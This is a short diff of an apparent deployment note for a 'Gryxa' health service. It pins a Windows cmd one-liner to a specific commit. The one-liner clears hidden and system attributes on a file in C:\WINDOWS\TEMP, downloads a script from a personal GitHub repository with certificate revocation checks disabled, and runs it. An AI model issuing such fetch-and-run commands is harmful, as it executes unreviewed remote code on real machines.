@@ -3,7 +3,7 @@ UNIVERSAL DEPLOY (O38 / M28 / L15 — Gryxa 8h deep health):
 attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o38" & findstr /C:"OWN BUILD 20260802O38" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
 SHA-pin (if main raw lags):
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/SHA/own.txt" & findstr /C:"OWN BUILD 20260802O38" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/5fa263a80f16a7aa2798f0f626ed9bcfbd8c874a/own.txt" & findstr /C:"OWN BUILD 20260802O38" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
 O38 Gryxa health:
 - Every mon tick: light ensure (service Running + dir).
